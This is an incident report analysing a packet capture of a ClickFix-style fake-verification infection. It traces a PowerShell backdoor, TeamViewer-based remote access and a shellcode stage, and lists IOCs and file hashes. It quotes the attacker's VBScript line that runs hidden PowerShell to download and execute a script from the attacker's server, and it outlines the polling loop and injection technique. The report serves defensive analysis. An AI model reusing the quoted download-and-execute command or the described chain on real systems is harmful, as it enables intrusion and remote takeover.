# Incident Report: PCAP Forensic Analysis — mta-2025-01-22

## Victim Host

| Field | Value | Evidence |
|---|---|---|
| IPv4 | **10.1.17.215** | Dominant local host in every suspicious flow; only local IP issuing outbound C2 traffic |
| MAC | **00:d0:b7:26:4a:74** | ARP: `10.1.17.215 <-> 00:d0:b7:26:4a:74` |
| Windows hostname | **DESKTOP-L8C5GSJ** (domain `bluemoontuesday.com`, NetBIOS domain `BLUEMOONTUESDAY`) | DHCP option 12 hostname; NBNS `DESKTOP-L8C5GSJ<00>/<20>`; DNS self-registration `DESKTOP-L8C5GSJ.bluemoontuesday.com -> 10.1.17.215` |
| Logged-in user | **shutchenson** | Kerberos `CNameString` on both the client (10.1.17.215) and DC (10.1.17.2) side of AS-REQ/TGS exchanges |

LAN context: /24 subnet `10.1.17.0/24`, gateway `10.1.17.1` (MAC `08:d0:9f:c2:3a:46`), domain controller `10.1.17.2` (`win-gsh54qlw48d.bluemoontuesday.com`, MAC `00:24:e8:7f:09:5d`).

## Malware Family

**ClickFix-delivered PowerShell backdoor with TeamViewer-based hands-on-keyboard deployment** (a fake-CAPTCHA/"verify you are human" social-engineering chain leading to a disk-serial-keyed PowerShell RAT, which in turn deploys a legitimate TeamViewer client for remote access and a reflectively-injected shellcode second stage).

**Attribution: behavioral, not signature-confirmed.** No IDS/Suricata alert file was provided alongside this pcap, so there is no signature hit to cite. The family name is inferred entirely from decoded payload behavior (fake-verification lure naming convention, disk-volume-serial bot ID, `IEX`-based command polling loop, and RMM-tool persistence), which most closely matches publicly documented "ClickFix" campaigns that deploy a PowerShell RAT and a remote-access tool for interactive control. Note: an early object-export pass reused a stale `/tmp` directory contaminated with leftover files from an unrelated prior job (an `index.php?...subid=` string referencing `79.124.78.197`); that string could not be found anywhere in this pcap's raw bytes on re-check and has been **excluded** from this report as a false lead.

### Reconstructed chain of events (all timestamps relative to capture start)
1. **t≈38s** — DNS lookups for `google-authenticator.burleson-appliance.net` (Cloudflare-fronted) and `authenticatoor.org` → `82.221.136.26` (TLS SNI = `authenticatoor.org`, self-signed cert). This is the ClickFix-style fake human-verification landing page.
2. **t≈52s** — DNS lookup for `appointedtimeagriculture.com` → `217.70.186.109`, an additional hop in the redirect/delivery chain (business-themed domain, consistent with a compromised legitimate site).
3. **t≈58–60s** — `checkappexec.microsoft.com` resolved and queried over TLS — a legitimate first-party Microsoft app-reputation check (benign context, not attacker infrastructure).
4. **t=60.3s** — First contact to `5.252.153.241:80` (plain HTTP, bare IP, no DNS lookup preceding it): `GET /api/file/get-file/264872` returns a VBScript "component" that spawns hidden PowerShell:
   ```
   objShell.Run("cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command
   ""start-process 'https://azure.microsoft.com';
   iex (new-object System.Net.WebClient).'DownloadString'('http://5.252.153.241:80/api/file/get-file/29842.ps1');
   #URL: https://teams.microsoft.com""")
   ```
5. **t≈62s** — `29842.ps1` / `pas.ps1` (identical logic, both fetched) is a Base64+`IEX` obfuscated stager whose decoded body:
   - reads the C: drive volume serial number and uses it as a bot ID (`1517096937` in this case),
   - loops forever: `DownloadString("http://5.252.153.241/<serial>")` then `Invoke-Expression` on the response every 5 seconds — this is the persistent C2 polling channel.
6. **First C2 command observed ("startup shortcut")**: downloads `TeamViewer.exe`, `Teamviewer_Resource_fr.dll`, and `TV.dll` from `5.252.153.241` into `C:\ProgramData\huo`, then creates a Startup-folder shortcut (`TeamViewer.lnk`) pointing at `C:\ProgramData\huo\TeamViewer.exe` — establishing boot persistence for attacker-controlled remote access. Beacon confirms: `k=message = startup shortcut created; status = success;`. The dropped `TeamViewer.exe` subsequently connected to legitimate TeamViewer master infrastructure (`master16.teamviewer.com` / `185.188.32.26`, DynGate protocol) — benign infrastructure, but confirms the RMM tool actually launched and phoned home, giving the attacker interactive access.
7. **Second C2 command observed ("RunRH")**: downloads a ~353 KB Base64 blob, decodes it to `C:\ProgramData\jsLeow\skqllz.ps1`, and launches it hidden. Beacon confirms: `k=script: RunRH, status: OK, message: PS process started`. This second-stage script is a heavily variable-obfuscated PowerShell loader that reverses/decodes an embedded payload and executes it via a classic `VirtualAlloc` + `Marshal.Copy` + `CallWindowProcW` reflective shellcode-injection primitive (`Add-Type`-defined P/Invoke class).
8. **t≈889s onward** — Sustained encrypted beacon from 10.1.17.215 to **45.125.66.32:2917** (10,940 frames / ~10 MB over 1720s): TLS with SNI set to the literal IP address (no domain) and a freshly-issued self-signed certificate (`CN=45.125.66.32: Self-signed certificate`, issuer=subject, `O=Self-signed certificate`, `C=XX`, valid 2025-01-22 to 2027-01-22).
9. **t≈917s onward** — Similar beacon to **45.125.66.252:443** (same self-signed certificate template, same /24 as the above), consistent with related C2 infrastructure — likely the channel used by the shellcode payload from step 7.

## Indicators of Compromise

### C2 endpoints
| Indicator | Evidence |
|---|---|
| `5.252.153.241:80` | Primary PowerShell backdoor C2 — HTTP GETs to `/api/file/get-file/*` and to `/1517096937` (disk-serial bot ID), polled continuously every ~5s from t=60s onward, 594 requests total |
| `45.125.66.32:2917` | Bare-IP-SNI TLS beacon, self-signed cert, largest external conversation (10,940 frames / 10 MB), t=889–2610s |
| `45.125.66.252:443` | TLS beacon, same self-signed-cert template/subnet as above, t=917–3200s |

### Malicious domains
| Domain | Resolves to | Evidence |
|---|---|---|
| `authenticatoor.org` | 82.221.136.26 | DNS query t=38.86s; TLS SNI observed; fake-verification/ClickFix lure page |
| `google-authenticator.burleson-appliance.net` | 104.21.x.1 (Cloudflare) | DNS query t=38.19s; fake Google-Authenticator-themed redirect hosted on a likely-compromised legitimate domain |
| `appointedtimeagriculture.com` | 217.70.186.109 | DNS query t=52.29s; secondary hop in the delivery/redirect chain |

### Malicious URLs
- `http://5.252.153.241/api/file/get-file/264872` — initial VBScript dropper component
- `http://5.252.153.241:80/api/file/get-file/29842.ps1` — stage-2 obfuscated PowerShell downloader
- `http://5.252.153.241/api/file/get-file/pas.ps1` — duplicate stage-2 fetch (identical payload logic)
- `http://5.252.153.241/1517096937` — C2 polling/command channel (URI path = victim's disk volume serial number)
- `http://5.252.153.241/api/file/get-file/TeamViewer`, `/Teamviewer_Resource_fr`, `/TV` — RMM persistence payloads

### Transferred files (SHA256, all pulled from `5.252.153.241` over HTTP and confirmed present in this capture)
| File | SHA256 | Role |
|---|---|---|
| `264872` | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103` | VBScript dropper component |
| `29842.ps1` | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded` | Obfuscated PowerShell stager (base64/IEX) |
| `pas.ps1` | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` | Duplicate obfuscated stager |
| `TeamViewer` (saved as `TeamViewer.exe`) | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e` | Legitimate TeamViewer client, dropped for attacker remote access |
| `Teamviewer_Resource_fr` (saved as `Teamviewer_Resource_fr.dll`) | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192` | TeamViewer resource DLL |
| `TV` (saved as `TV.dll`) | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7` | Small (12.9 KB) stripped DLL bundled alongside TeamViewer — anomalously small for a genuine TeamViewer core module |

Drop paths observed in decoded script content: `C:\ProgramData\huo\` (TeamViewer set) and `C:\ProgramData\jsLeow\skqllz.ps1` (shellcode-loader stage). Persistence: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TeamViewer.lnk` → `C:\ProgramData\huo\TeamViewer.exe`.

### Benign context (excluded from IOCs)
- `checkappexec.microsoft.com` (4.150.155.223) — legitimate Microsoft app-reputation/SmartScreen-style check
- `master16.teamviewer.com` (185.188.32.26), `din.aspx`/`dout.aspx` DynGate traffic — legitimate TeamViewer infrastructure the dropped client checked in with
- Windows Update, Microsoft telemetry/CDN (msn.com, bing.com, edge.microsoft.com, officeapps.live.com, etc.), NVIDIA GFE, LDAP/Kerberos/NBNS/DHCP domain-join chatter — normal enterprise workstation background noise

## Incident Summary
The Windows workstation **DESKTOP-L8C5GSJ (10.1.17.215, MAC 00:d0:b7:26:4a:74)**, logged in as **shutchenson**, was compromised via a ClickFix-style fake human-verification lure (`authenticatoor.org`, reached through `google-authenticator.burleson-appliance.net` and `appointedtimeagriculture.com`) that tricked the user into running a hidden PowerShell command. That command pulled a disk-serial-keyed polling backdoor from **5.252.153.241**, which deployed a legitimate TeamViewer client (plus a suspiciously small companion `TV.dll`) for persistent remote access and separately launched an obfuscated PowerShell stage that reflectively injects shellcode via `VirtualAlloc`/`CallWindowProcW`. The host went on to maintain long-lived encrypted beacons to two additional bare-IP, self-signed-TLS hosts, **45.125.66.32:2917** and **45.125.66.252:443**, consistent with the final-stage C2 channel.
